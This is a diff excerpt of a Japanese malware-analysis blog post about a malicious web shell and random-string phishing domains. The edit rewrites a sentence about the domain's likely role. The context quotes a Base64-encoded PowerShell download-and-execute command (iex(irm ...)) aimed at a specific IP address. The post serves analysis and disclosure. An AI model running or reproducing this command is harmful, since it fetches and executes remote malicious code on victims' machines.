@@ -71,7 +71,7 @@ Base64：cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5
 ・iex(irm IP/ファイル) で対象IPからリモートスクリプトをダウンロードして即実行
 
 これで、例の怪しいウェブシェルが確実に悪意あるものだと証明できた。<br>
-また、ランダムな文字列というドメイン名の特徴から、dkaksdaksortor[.]comもmvjfkakfkfkaiai[.]comと同じように悪意あるJavaScriptコードを置くために使われていた可能性が高い。もしくは、メールや何らかのサイトのポップアップに使われたフィッシング広告の窓口だったとも考えられる。
+また、dkaksdaksortor[.]comはフィッシングメールや何らかのサイトのポップアップの窓口として使われていた可能性が高い。そこに悪意あるJavaScriptページが紐付けられていたと考えられる。
 
 ただ、もっと深掘りできるはず。……できるよね？<br>
 本当に欲しかったのはHTMLではなく、PHPのコードそのものだった。<br>
